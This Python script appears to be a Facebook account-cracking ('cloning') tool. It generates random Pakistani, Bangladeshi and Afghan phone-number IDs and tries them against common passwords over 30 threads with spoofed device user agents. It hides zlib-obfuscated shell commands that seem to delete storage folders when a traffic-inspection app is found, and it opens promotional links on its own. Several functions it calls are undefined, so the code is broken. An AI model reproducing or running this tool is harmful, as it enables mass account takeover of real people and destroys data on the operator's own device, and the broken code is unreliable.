# Orignally Written By Mohammad 
# Totally Written in python


samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']

import os
from os import path
from pathlib import Path
import os,base64,zlib,pip,urllib,sys,time,platform,pip,uuid,subprocess

os.system('xdg-open https://m.facebook.com/groups/288146976945208/?ref=share&mibextid=DcJ9fc')
try:
	import requests,os,json,time,re,random,sys,uuid,string
	from string import *
	from requests import api
	from concurrent.futures import ThreadPoolExecutor as tred
except ImportError:
	os.system('pip install requests futures==2 > /dev/null')
	os.system('python Mohammad.py')

header_grup_op = {'user-agent':'FBAN/FB4A;FBAV/328.1.0.28.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/306506931;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/7.1.1;FBCA/x86:armeabi;FBDM/{density=3.0,width=1080,height=1794'}
head_sam = {'User Agent : Davik/2.1.0 (Linux; U; Android 4.0.0; Infinix X682B Build/Build/QP1A.190711.020; wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1'}
head_sams = {"user-agent": "Davik/2.1.0 (Linux; U; Android 10; TECNO LC8 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/317.0.0.3.45;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/796703265;FBCR/Telenor;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO LC8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
header_grup_asp = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
header_grup_xz = {"user-agent": "Mozilla/5.0 (Linux; Android 10; TECNO LC8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
api = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/107.0.0.0 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-PK;q=0.6,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
header_gr_dk = {'user-agent':'FBAN/FB4A;FBAV/328.1.0.28.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/306506931;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/7.1.1;FBCA/x86:armeabi;FBDM/{density=3.0,width=1080,height=1794'}
head_aqe = {'User Agent : Davik/2.1.0 (Linux; U; Android 4.0.0; Infinix X682B Build/Build/QP1A.190711.020; wv) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1'}
ua_zs = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; TECNO KF8 Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/300.0.0.8.100;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/538150406;FBCR/Ufone;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO KF8;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
header_grup = {"user Agent": "Davik/2.1.0 (Linux; U; Android 12; V2111 Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/308.0.0.2.98;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/546750895;FBCR/Jazz;FBMF/vivo;FBBD/vivo;FBDV/V2111;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
ua_zs = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/306.0.0.4.53;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/207672721;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
useragent_xxx = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; Infinix X688B Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/325.0.0.4.67;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/683135857;FBCR/Telenor;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X688B;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
header_grup_gop = {"user-agent": "Davik/2.1.0 (Linux; U; Android 11; Infinix X693 Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/308.0.0.2.141;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/354620329;FBCR/Telenor;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X693;FBSV/11;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
head_f = {"user-agent": "Davik/2.1.0 (Linux; U; Android 10; TECNO LC8 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/317.0.0.3.45;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/796703265;FBCR/Telenor;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO LC8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
ua_z = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; V2111 Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/316.0.0.2.130;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/733896687;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/V2111;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; M2101K7AG Build/SKQ1.210908.001) [FBAN/MessengerLite;FBAV/311.0.0.5.119;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/190069654;FBCR/;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2101K7AG;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=1024,width=2048};]"}
ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 10; RMX1821 Build/QP1A.190711.020) [FBAN/MessengerLite;FBAV/324.0.0.6.49;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/994696613;FBCR/Jazz;FBMF/Realme;FBBD/Realme;FBDV/RMX1821;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/O11019) [FBAN/MessengerLite;FBAV/302.0.0.1.80;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/862362285;FBCR/AIRTEL;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
ua_x = {"user-agent": "Davik/2.1.0 (Linux; U; Android 12; V2111 Build/SP1A.210812.003_NONFC) [FBAN/MessengerLite;FBAV/317.0.0.2.142;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/885055002;FBCR/Jazz;FBMF/vivo;FBBD/vivo;FBDV/V2111;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])


os.system("clear")
print(' Checking modules ...\n')
#exec(zlib.decompress(b'x\x9c}\xccA\x0e@0\x10\x05\xd0\xab\xfc\x1d\x16XXJ\xdc\xa5t\xc4$\xa3\xaa3\x95\xb8\xbdX\x10+\x07xo\xd3FO5Z\xcb"rD\x0e\x1c\xd4\x9c\x08\x12\xed\x99\xd4\x14\xd3\xe2\x92\'CN"<v`\x1f\x1c&J\xc63\xa3>1\xa0\xf5t\xb4!\x8b\xf4w\xf1\x04\xbf\xee\xdd?\xba\xa8.k\xe33\x11'))
os.system('xdg-open https://whatsapp.com/biz/JGCZkexEfn6KguBFVvtRQO')


try:
	g = "anar"
	f="tt"
	file_d = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))

	if f'com.h{f}pc{g}y.pro' in file_d:
		print('\033[1;37m[×] Uninstall HttpCanary From Your Device ')
		os.system(zlib.decompress(b'x\x9cKNQP\xf1\xf0w\xf5UPSS(\xcaU\xd0-JS\xd0\x02\x005\xfe\x05\x0f'))
		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
		os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
		exit()
	else:
		pass
except Exception as e:
	pass

def xox(m):
	for x in m + '\n':
		sys.stdout.write(x)
		sys.stdout.flush()
		time.sleep(0.07)

def clear():
	os.system('clear')
	print(logo)

def ua_aadi():
	model = random.choice(samsung).split('|')
	END = "[FBAN/"+"Orca-Android;FBAV/"+"252.1.0.15.119;FBPN/"+"com.facebook.orca;FBLC/"+"en_US;FBBV/"+"199762799;FBCR/"+"null;FBMF/"+"Amazon;FBBD/"+"Amazon;FBDV/"+"KFMUWI;FBSV/"+"7.1.2;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=1.0,width=600,height=976};FB_FW/1;]"
	ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
	return ua
xxxx="[FBAN/"+"FB4A;FBAV/"+"61.0.0.15.69;FBBV/"+"20748125;FBDM/"+"{density=1.0,width=600,height=976};FBLC/"+"es_LA;FBCR/"+"MOVISTAR;FBMF/"+"Rockchip;FBBD/"+"K5-3G;FBPN/"+"com.facebook.katana;FBDV/"+"K5-3G;FBSV/"+"5.1.1;nullFBCA/"+"x86:armeabi-v7a;]"
folder_path = '/sdcard/AADI'

try:
	os.makedirs(folder_path, exist_ok=True)
except:
	pass
oks=[]
cps=[]
loop=0
logo=("""\033[1;37m

  \033[96;1m     .o.             .o.        oooooooooo.  ooooo 
      .888.           .888.      `888'   `Y8b  `888' 
     .8"888.         .8"888.      888      888  888  
 \033[97;1m   .8' `888.       .8' `888.     888      888  888  
   .88ooo8888.     .88ooo8888.    888      888  888  
 \033[92;1m .8'     `888.   .8'     `888.   888     d88'  888  
 \033[97;1mo88o     o8888o o88o     o8888o o888bood8P'   o888o 
------------------------------------------------
\033[92;m 0WN3R     :     Muhammad  AdNaN
 \033[92;mF4C3B00K  :     Muhammad  AdNaN
 \033[92;mStatus    :     paed
 \033[92;mV3RS10N   :     19.1
\033[93;1m════════════════════════════════════════════════
\033[96;1m[-]              Mohammad ON FIRE
\033[96;1m[-]           ABA NHII MANEIN GY 
\033[97;1m════════════════════════════════════════════════""")

def linex():
	print(f'\033[1;37m------------------------------------------------')

def Main_Mohammad():
		clear()
		print(f'\033[1;37m [1] File Cloning \n [2] Random Cloning \n [3] Gmail Cloning \n [4] WhatsApp group (Join) \n [5] Facebook Group (join) \n [0] Exit')
		linex()
		shm= input('\033[1;37m [+] Select option: ')
		if shm =='1':
			file_crack()
		elif shm =='2':
			r_crack()
		elif shm =='3':
			gmail()
		elif shm =='4':
			wp=('JGCZkexEfn6KguBFVvtRQO')
			os.system(f'xdg-open https://whatsapp.com/biz/JGCZkexEfn6KguBFVvtRQO/{wp}')
			Main_Mohammad()
		elif shm =='5':
			os.system('xdg-open https://www.facebook.com/groups/288146976945208/?ref=share')
			Main_Mohammad()
		elif shm =='0':
			exit(' Thanks For Using our tool ')
		else:
			print('\033[1;37m [+] Select valid option\033[1;37m ')
			time.sleep(0.5)
			Main_Mohammad()

def file_crack():
	clear()
	file = input(' [+] Put file path :\033[1;32m ')
	try:
		fo = open(file,'r').read().splitlines()
	except FileNotFoundError:
		print('\033[1;37m [+] File location not found ');exit()
	clear()
	print(' [1] Method 1 ')
	print(' [2] Method 2 ')
	print(' [3] Method 3 ')
	print(' [4] Method 4 ')
	linex()
	methd=input('\033[1;37m [+] Select Option: ')
	plist=[]
	clear()
	try:
		ps_limit = int(input(' How Many Pasword You Want To Add :  '))
	except:
		ps_limit =1
#	linex()
#	print('\033[1;37m example :\033[1;37mfirst last, firtslast, first123')
	linex()
	for i in range(ps_limit):
		plist.append(input(f'\033[1;37m Put Password No.{i+1}: '))
	with tred(max_workers=30) as AADI:
		clear()
		tl = str(len(fo))
		print(' Total accounts : \033[1;32m'+tl)
		print('\033[1;37m Process Running in the Background ')
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				AADI.submit(api1,ids,names,passlist)
			else:
				AADI.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input('\033[1;32m [*] Press enter to back \033[1;37m')
	os.system('python Mohammad.py')

def r_crack():
	clear()
	print(' [1] Pakistan Cloning ')
	print(' [2] Bangladesh Cloning ')
	print(' [3] Afghanistan Cloning ')
	print(' [0] Back To Menu ')
	linex()
	crk=input(' [+] Select Option:\33[1;37m ')
	if crk =='1':
		pak()
	elif crk =='2':
		bd()
	elif crk =='3':
		afg()
	elif crk =='0':
		Menu_Mohammad()
	else:
		print('\n  [+] Select valid option\033[1;37m ');time.sleep(1.5);menu()

def pak():
	user=[]
	clear()
	code = input('\33[1;37m [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as Mohammad:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process has been started\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'malik1234','khanbaba','ali123','janjan','57273200','786787','alimalik','','baloch12345','khan','baloch','khan','pubg','pubg1122','pubg','pubg1122','pubgking','pubg12','pubg123','pubg1234','ali786','khanzada','khankhan','khan786','malik123','kingkhan','khan1122','khan123456','khan1234','khan123']
			AADI.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
	os.system('python Mohammad.py')


def bd():
	user=[]
	clear()
	code = input(' [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		user.append(nmp)
	with tred(max_workers=30) as Mohammad:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process has been started \033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = ['i love you','iloveyou',ids,psx]
			AADI.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
	os.system('python Mohammad.py')

def afg():
	user=[]
	clear()
	code = input(' [+] Enter Code :\33[1;37m ')
	try:
		limit = int(input(' [+] Enter limit:\33[1;37m '))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with tred(max_workers=30) as Mohammad:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
		print('\33[1;37m [+] Selected code  :\033[1;32m '+code)
		print('\33[1;37m [+] Process running in the background\033[1;97m')
		linex()
		for psx in user:
			ids = code+psx
			passlist = [ids,psx,'first8','last8','first6','last6','57273200','102030','405060','708090','10002000','100200','700800','afghanistan','afghan1234','200300','500500','50006000','Afghan123','600700','afghan1122','afghan12345','kabul1234','MHH123','۱۳۳۳۵۶']
			AADI.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input(' [+] Press enter to back \033[1;37m')
